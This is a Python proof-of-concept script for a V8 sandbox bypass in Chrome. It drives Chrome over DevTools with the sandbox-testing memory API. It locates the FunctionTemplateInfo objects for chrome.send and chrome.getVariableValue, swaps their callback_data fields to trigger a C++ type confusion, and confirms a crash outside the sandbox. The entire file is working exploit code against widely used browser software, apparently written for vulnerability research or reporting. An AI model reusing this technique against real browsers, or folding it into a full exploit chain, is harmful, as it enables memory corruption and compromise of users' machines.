#!/usr/bin/env python3
"""
V8 Sandbox Bypass PoC: Gin FunctionTemplateInfo EPT Type Confusion

Swaps callback_data between chrome.send and chrome.getVariableValue
FunctionTemplateInfo objects, triggering a C++ type confusion that
crashes outside the V8 sandbox.

Requirements:
    Chrome built with v8_enable_sandbox=true, v8_enable_memory_corruption_api=true, is_asan=false
    pip install websocket-client
"""
import argparse, json, os, re, subprocess, sys, time, urllib.request, websocket

# FTI object layout (x64, pointer-compressed, sandbox-enabled)
SFI_OFF  = 16  # JSFunction    -> SharedFunctionInfo
FTI_OFF  = 8   # SFI           -> FunctionTemplateInfo
CD_OFF   = 44  # FTI           -> callback_data
CB_OFF   = 60  # FTI           -> callback (EPT handle)
FTI_SIZE = 64


def cdp(ws, method, params=None, timeout=30):
    mid = int(time.time() * 1e6) % 10**7
    ws.send(json.dumps({"id": mid, "method": method, **({"params": params} if params else {})}))
    deadline = time.time() + timeout
    while time.time() < deadline:
        ws.settimeout(max(0.5, deadline - time.time()))
        try:
            r = json.loads(ws.recv())
            if r.get("id") == mid:
                return r
        except Exception:
            break
    return None


def js(ws, expr, timeout=30):
    r = cdp(ws, "Runtime.evaluate", {"expression": expr, "returnByValue": True}, timeout)
    if not r:
        return "TIMEOUT"
    if r.get("result", {}).get("exceptionDetails"):
        return "EXCEPTION"
    return r.get("result", {}).get("result", {}).get("value")


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--chrome", required=True)
    p.add_argument("--port", type=int, default=9400)
    args = p.parse_args()

    port = args.port
    userdata = f"/tmp/chrome-poc-gin-ept-{port}"
    stderr_path = f"/tmp/chrome-poc-gin-ept-{port}-stderr.log"
    os.makedirs(userdata, exist_ok=True)
    open(stderr_path, "w").close()
    ferr = open(stderr_path, "w")

    proc = subprocess.Popen([
        args.chrome,
        "--js-flags=--sandbox-testing --allow-natives-syntax",
        "--no-sandbox", "--single-process",
        f"--remote-debugging-port={port}", f"--user-data-dir={userdata}",
        "--disable-gpu", "--headless=new", "--remote-allow-origins=*",
        "about:blank",
    ], stdout=subprocess.DEVNULL, stderr=ferr)

    sandbox_base = None
    try:
        # Wait for DevTools
        tabs = None
        for _ in range(30):
            try:
                tabs = json.loads(urllib.request.urlopen(f"http://127.0.0.1:{port}/json", timeout=2).read())
                break
            except Exception:
                time.sleep(1)
        assert tabs, "Chrome did not start"

        target = next(t for t in tabs if t.get("type") == "page")
        ws = websocket.create_connection(target["webSocketDebuggerUrl"], timeout=120)
        cdp(ws, "Runtime.enable")
        cdp(ws, "Page.enable")

        # Navigate to chrome://version (exposes chrome.send + chrome.getVariableValue)
        cdp(ws, "Page.navigate", {"url": "chrome://version"})
        time.sleep(5)

        # Read sandbox base
        ferr.flush()
        sb_match = re.search(r"Sandbox bounds: \[(0x[0-9a-f]+)", open(stderr_path).read())
        assert sb_match, "Sandbox bounds not found"
        sandbox_base = int(sb_match.group(1), 16)
        print(f"Sandbox base: 0x{sandbox_base:x}")

        # Locate FTIs and read callback_data / callback fields
        info = json.loads(js(ws, f"""
        (function() {{
            function fti(fn) {{
                var addr = Sandbox.getAddressOf(fn) & ~1;
                var sfi = new DataView(new Sandbox.MemoryView(addr, 32)).getUint32({SFI_OFF}, true) & ~1;
                var fti = new DataView(new Sandbox.MemoryView(sfi, 16)).getUint32({FTI_OFF}, true) & ~1;
                var dv = new DataView(new Sandbox.MemoryView(fti, {FTI_SIZE}));
                return {{fti: fti, cd: dv.getUint32({CD_OFF}, true), cb: dv.getUint32({CB_OFF}, true)}};
            }}
            var s = fti(chrome.send), g = fti(chrome.getVariableValue);
            return JSON.stringify({{sFTI: s.fti, sCD: s.cd, sCB: s.cb, gFTI: g.fti, gCD: g.cd, gCB: g.cb}});
        }})()
        """))
        print(f"FTI[send]  callback_data=0x{{0:08x}}  callback=0x{{1:08x}}".format(info["sCD"], info["sCB"]))
        print(f"FTI[getVV] callback_data=0x{{0:08x}}  callback=0x{{1:08x}}".format(info["gCD"], info["gCB"]))

        # Swap callback_data
        assert js(ws, f"""
        (function() {{
            new DataView(new Sandbox.MemoryView({info['sFTI']}, {FTI_SIZE})).setUint32({CD_OFF}, {info['gCD']}, true);
            new DataView(new Sandbox.MemoryView({info['gFTI']}, {FTI_SIZE})).setUint32({CD_OFF}, {info['sCD']}, true);
            return 'ok';
        }})()
        """) == "ok", "Swap failed"
        print("callback_data swapped")

        # Trigger type confusion
        print("Triggering chrome.send('x') ...")
        js(ws, "(function(){try{chrome.send('x')}catch(e){}})()", timeout=10)
        time.sleep(3)
        try: ws.close()
        except: pass

    except Exception as e:
        print(f"Error: {e}")
    finally:
        proc.terminate()
        try: proc.wait(timeout=5)
        except: proc.kill()
        ferr.close()

        # Check result
        stderr_text = open(stderr_path).read()
        if "## V8 sandbox violation detected" in stderr_text:
            idx = stderr_text.find("## V8 sandbox violation")
            block = stderr_text[idx:idx + 600]
            print()
            print(block.rstrip())

            addr_m = re.search(r"Received signal 11 \w+ ([0-9a-f]+)", block)
            if addr_m and sandbox_base is not None:
                crash = int(addr_m.group(1), 16)
                hi = sandbox_base + (1 << 40)
                outside = crash < sandbox_base or crash >= hi
                print(f"\nCrash: 0x{crash:x}  Sandbox: [0x{sandbox_base:x}, 0x{hi:x})")
                print(f"  -> {'OUTSIDE' if outside else 'inside'} sandbox")
            print("\n[+] V8 sandbox violation triggered")
            sys.exit(0)
        else:
            print("\n[-] No sandbox violation detected")
            sys.exit(1)


if __name__ == "__main__":
    main()
